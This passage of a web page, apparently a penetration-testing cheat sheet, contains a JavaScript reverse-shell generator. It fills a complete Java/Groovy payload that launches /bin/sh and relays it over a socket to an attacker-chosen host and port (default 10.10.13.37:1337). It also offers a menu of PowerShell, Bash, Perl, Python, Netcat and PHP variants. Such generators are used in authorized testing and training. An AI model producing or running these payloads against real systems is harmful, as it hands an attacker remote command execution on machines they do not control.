            res_raw = "String host=\"" + lhost + "\";\nint port=" + lport + ";\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){\n\twhile(pi.available()>0)so.write(pi.read());\n\twhile(pe.available()>0)so.write(pe.read());\n\twhile(si.available()>0)po.write(si.read());\n\tso.flush();\n\tpo.flush();\n\tThread.sleep(50);\n\ttry {\n\t\tp.exitValue();\n\t\tbreak;\n\t} catch (Exception e){}\n};\np.destroy();\ns.close();";
            res_oneliner = "# No one-liner for this payload";
            res_encoded = "# No encoder for this payload";
        }

        updateOutput("rs_result_raw", res_raw, res_raw_hljs);
        updateOutput("rs_result_oneliner", res_oneliner, res_oneliner_hljs);
        updateOutput("rs_result_encoded", res_encoded, res_encoded_hljs);
    }
</script>
<div style="display:flex; width:auto; flex-flow: row wrap;">
    <label for="rs_lhost">LHOST:</label>
    <input name="rs_lhost" id="rs_lhost" style="margin: 0 10px 0 0" onchange="updateCommandOutput()"/>
    <label for="rs_lport">LPORT:</label>
    <input name="rs_lport" id="rs_lport" style="margin: 0 10px 0 0" onchange="updateCommandOutput()"/>
    <label for="rs_select_language">Language:</label>
    <select id="rs_select_language" style="margin: 0 10px 0 0" onchange="updateCommandOutput()">
        <option value="psh">PowerShell</option>
        <option value="psh_ssl">PowerShell (SSL/TLS)</option>
        <option value="psh_powersploit">PowerShell (PowerSploit)</option>
        <option value="psh_powercat">PowerShell (Powercat)</option>
        <option value="bash">Bash</option>
        <option value="bash_mkfifo">Bash (mkfifo)</option>
        <option value="perl">Perl</option>
        <option value="perl_web">Perl (web server)</option>
        <option value="python">Python</option>
        <option value="netcat">Netcat</option>
        <option value="php">PHP</option>
        <option value="groovy">Groovy</option>
    </select>
</div>

#### One-liner

<pre id="rs_result_oneliner"></pre>

#### Encoded

<pre id="rs_result_encoded"></pre>

#### Raw

<pre id="rs_result_raw"></pre>

<script>
    
    if (sessionStorage.getItem("rs_select_language") != null) {
        for (i=0; i < document.getElementById("rs_select_language").length; i++) {
            if (document.getElementById("rs_select_language")[i].value == sessionStorage.getItem("rs_select_language")) {
                document.getElementById("rs_select_language")[i].selected = "true"; 
                break;
            }
        }
    }

    if (sessionStorage.getItem("rs_lhost") != null) {
        document.getElementById("rs_lhost").value = sessionStorage.getItem("rs_lhost");
    } else {
        document.getElementById("rs_lhost").value = "10.10.13.37";
    }
    
    if (sessionStorage.getItem("rs_lport") != null) {
        document.getElementById("rs_lport").value = sessionStorage.getItem("rs_lport");
    } else {
        document.getElementById("rs_lport").value = "1337";
    }

    updateCommandOutput();

</script>
